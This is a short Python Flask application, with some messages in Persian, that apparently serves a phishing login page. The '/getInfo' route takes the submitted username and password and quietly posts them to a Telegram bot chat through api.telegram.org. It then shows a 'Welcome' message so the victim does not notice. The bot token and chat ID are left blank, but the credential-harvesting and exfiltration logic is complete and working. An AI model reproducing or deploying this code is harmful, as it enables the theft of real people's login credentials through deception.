from flask import Flask, request , render_template
import requests

app = Flask(__name__)
# token bot
TOKEN = ""
# chat id 
chatID = int()

def send_bot(username , password) -> None:
    
    URL = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    try:
        response = requests.post(
            URL,
            data={
                "chat_id": chatID,
                "text": f"""
                username : {username}
                password : {password}
"""
            }
        )
    except:
        pass


@app.route("/")
def main():
    return render_template("index.html")


@app.route("/getInfo", methods=["POST"])
def info():
    user = request.form.get("user")
    password = request.form.get("password")
    if user and password:
        if len(user) >= 4 and len(password) >= 5:  # شرط درست
            send_bot(username=user, password=password)
            return f"Welcome {user}"
        else:
            return "Username باید حداقل ۴ کاراکتر و Password حداقل ۵ کاراکتر باشد"
    return "Missing data"


app.run(debug=True)